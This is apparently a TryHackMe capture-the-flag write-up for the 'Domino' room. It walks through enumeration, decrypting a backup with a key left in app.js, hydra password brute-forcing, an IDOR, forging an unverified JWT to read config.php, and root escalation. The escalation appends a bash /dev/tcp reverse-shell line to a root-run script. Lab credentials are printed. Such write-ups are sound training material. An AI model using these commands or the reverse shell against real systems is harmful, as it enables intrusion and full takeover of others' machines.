# TryHackMe - Domino
This write up is my solution to the TryHackMe room [Domino](https://tryhackme.com/room/domino). Fragments about finding the flags are in **bold**, the flags themselves are redacted or not included.

## Enumeration

Let's start with a nmap scan with version enumeration:

```
$ nmap -sV 10.112.146.196
Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-13 04:55 -0500
Nmap scan report for 10.112.146.196
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.39 seconds
```

SSH is hardly an entry point, so let's visit the site present on port 80. We are welcomed by login site to an employee portal. First thing that we can notice is that we already know the pattern of the usernames used, also we can see employers names by clicking on Our Team button. This enables us to create usernames file for future potential attacks.

![login](images/login.png)

![team](images/our_team.png)

The forgot password site does not look like an attack vector, however it works by providing username, which are known so it is not a good idea and they should have asked for an email instead.

We continue enumeration using gobuster with -x flag to also enable searching for certain file extensions.

```
$ gobuster dir -u http://10.112.146.196 -w /usr/share/wordlists/dirb/big.txt -x html,php,txt,log
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.146.196
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php,txt,log
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 279]
.htaccess.txt        (Status: 403) [Size: 279]
.htaccess.html       (Status: 403) [Size: 279]
.htaccess.php        (Status: 403) [Size: 279]
.htaccess.log        (Status: 403) [Size: 279]
.htpasswd            (Status: 403) [Size: 279]
.htpasswd.txt        (Status: 403) [Size: 279]
.htpasswd.php        (Status: 403) [Size: 279]
.htpasswd.html       (Status: 403) [Size: 279]
.htpasswd.log        (Status: 403) [Size: 279]
403.php              (Status: 200) [Size: 322]
admin                (Status: 301) [Size: 316] [--> http://10.112.146.196/admin/]
api                  (Status: 301) [Size: 314] [--> http://10.112.146.196/api/]
auth.php             (Status: 200) [Size: 0]
backup               (Status: 301) [Size: 317] [--> http://10.112.146.196/backup/]
config.php           (Status: 200) [Size: 0]
dashboard.php        (Status: 302) [Size: 0] [--> /index.php]
forgot.php           (Status: 200) [Size: 684]
index.php            (Status: 200) [Size: 861]
javascript           (Status: 301) [Size: 321] [--> http://10.112.146.196/javascript/]
logout.php           (Status: 302) [Size: 0] [--> /index.php]
reset.php            (Status: 200) [Size: 410]
server-status        (Status: 403) [Size: 279]
static               (Status: 301) [Size: 317] [--> http://10.112.146.196/static/]
support              (Status: 301) [Size: 318] [--> http://10.112.146.196/support/]
team.php             (Status: 200) [Size: 3747]
Progress: 102345 / 102345 (100.00%)
===============================================================
Finished
===============================================================
```

We have discovered a lot of interesting places, although access to most of them is forbidden or not visible for us except to default locations accesible for everyone like index.php, team.php etc. There is however one location that is publically available and should not be - /backup.

![backup](images/backup.png)

README.txt:
```
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

We then look at /static/app.js:

```
// NexusCorp Portal - Frontend Utilities
// v2.3.1 - Build 20241115

(function() {
    'use strict';

    // Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
    const CONFIG = {
        apiBase: '/api',
        // Encryption key for backup config decryption - AES-ECB-128
        // Key: N3xusK3y2024!!  (pad to 16 bytes with �)
        _backupKey: 'N3xusK3y2024!!',
        appVersion: '2.3.1'
    };

    // Session helper
    window.NexusApp = {
        getSession: function() {
            const cookie = document.cookie.split(';').find(c => c.trim().startsWith('nexus_session='));
            if (!cookie) return null;
            try {
                return JSON.parse(atob(cookie.split('=')[1].trim()));
            } catch(e) { return null; }
        },
        getApiToken: function() {
            return localStorage.getItem('nexus_jwt');
        },
        setApiToken: function(token) {
            localStorage.setItem('nexus_jwt', token);
        }
    };

    // Auto-fetch JWT if not cached
    if (!localStorage.getItem('nexus_jwt') && document.cookie.includes('nexus_session')) {
        fetch('/api/auth/token.php', {credentials: 'include'})
            .then(r => r.json())
            .then(d => { if (d.token) localStorage.setItem('nexus_jwt', d.token); })
            .catch(() => {});
    }
})();
```

This is code for session and API management but there is also a hardcoded backupKey that we can use to decrypt our config.enc file.

## Decrypting a file and initial access

```
$ openssl enc -d -aes-128-ecb \
> -K "4E337875734B3379323032342121" \
> -in config.enc \
> -out decrypted
hex string is too short, padding with zero bytes to length
```

We used openssl and specified AES-128 ECB as said in /backup/README.txt. -K is our key in HEX which is not padded but openssl is doing that for us.

```
$ cat decrypted 
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"} 
```

We got information that we already knew but also username of a system user - devops. We could try brute forcing this user via SSH, but I prefer to investigate the JWT further as we know that is is present. Let's try guessing user passwords with our usernames that we have gathered from /team.php.

After checking how credentials are sent and what output for invalid pair looks like we use command:
```
$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.114.183.92 http-post-form \ 
'/index.php:username=^USER^&password=^PASS^:Invalid credentials.'
```

It is a better idea to use custom wordlist based on the stuff we would find on the site but first I tried rockyou.txt.txt and I was succesful. Three users had word 'password' as their password.

![sarah](images/sarah_johnson.png)

**We can obtain first flag by taking advantage of an IDOR vulnerability in My Profile API (/api/users/profile.php?id=). We are logged in as user 3 but we can change the id parameter to see other users. Our flag is in the notes of user 1**.

## JWT

We can try getting a JWT by visiting /api/auth/token.php. When we do so we indeed receive it:

```
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTQ1Nzk0OTEsImV4cCI6MTc5NDU4MzA5MX0.LSDsZzdY88eQWRk0CWK2Jw3LiTPw7irV1vO2YUaHPhY","expires_in":3600,"note":"Use this token as: Authorization: Bearer <token> for \/api\/files.php"}
```

Now it is unable to view files like config.php through /api/files.php?name= endpoint because we need token with administrative privileges. We can paste the JWT into [JWT Debugger](https://www.jwt.io/) and change our role to admin and see if it will work. If it does that means the signature so the third part of the JWT is not being verified at all which creates a crucial vulnerability in the app.

![token](images/token.png)

Now when we send a request (for example using Burp or cURL) with our changed token it is possible to view config.php:

```
{"file":"\/var\/www\/html\/config.php","content":"<?php\ndefine('DB_HOST', 'localhost');\ndefine('DB_NAME', 'nexusdb');\ndefine('DB_USER', 'app_user');\ndefine('DB_PASS', 'D3v0ps!2024');\ndefine('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');\ndefine('APP_SECRET', 'nexus_app_k3y_2024');\n\nfunction get_db() {\n    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);\n    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n    return $pdo;\n}\n?>\n"}
```

We got credentials for database account but I tried using the DB_PASS for an earlier found devops account and it worked:

```
devops@tryhackme-2404:~$ id
uid=1001(devops) gid=1001(devops) groups=1001(devops)
```

**We get our second, third and fourth flag all in once. The second one is at /var/www/html/admin, the third flag is in the specified location to which devops has access and the fourth flag is literally the first thing we see after logging in on that user account.**

## Privilege escalation

Now we need to escalate our privileges to root. What I always like to check first is the cron jobs, but there was nothing interested there. sudo -l command also didn't lead me to anything as devops can't run sudo on the machine. As you see I am looking for some misconfigurations.

I set up a python server on my attacking machine and using curl i downloaded [pspy](https://github.com/dominicbreuker/pspy) on the targer machine. After waiting a few seconds I noticed a bash script that is worth investigating:
```
2026/11/13 19:47:01 CMD: UID=0     PID=2793   | /bin/bash /opt/monitoring/health_report.sh 
```

```
-rwxrwxr-- 1 root devops  537 May 18 10:41 health_report.sh
```

Let's create a reverse shell :)))

```
devops@tryhackme-2404:/opt/monitoring$ cat health_report.sh
#!/bin/bash
# NexusCorp Health Monitoring Script
LOG_FILE="/var/log/nexus_health.log"
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
echo "[$TIMESTAMP] Health check started" >> "$LOG_FILE"
systemctl is-active --quiet apache2 && echo "[$TIMESTAMP] Apache: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] Apache: DOWN" >> "$LOG_FILE"
systemctl is-active --quiet mysql && echo "[$TIMESTAMP] MySQL: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] MySQL: DOWN" >> "$LOG_FILE"
DISK=$(df -h / | awk "NR==2{print \$5}")
echo "[$TIMESTAMP] Disk: $DISK" >> "$LOG_FILE"
bash -i >& /dev/tcp/192.168.139.198/4444 0>&1
```

**And we got our last flag after gaining a root shell.**

```
$ nc -lvnp 4444         
listening on [any] 4444 ...
connect to [192.168.139.198] from (UNKNOWN) [10.114.140.7] 54198
bash: cannot set terminal process group (2840): Inappropriate ioctl for device
bash: no job control in this shell
root@tryhackme-2404:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2404:~# ls
ls
root.txt
snap
root@tryhackme-2404:~# cat root.txt
cat root.txt
THM{REDACTED}
root@tryhackme-2404:~# 
```

In this room we could learn exploiting JWT, IDOR, decrypting a file with a found key and doing privilege escalation.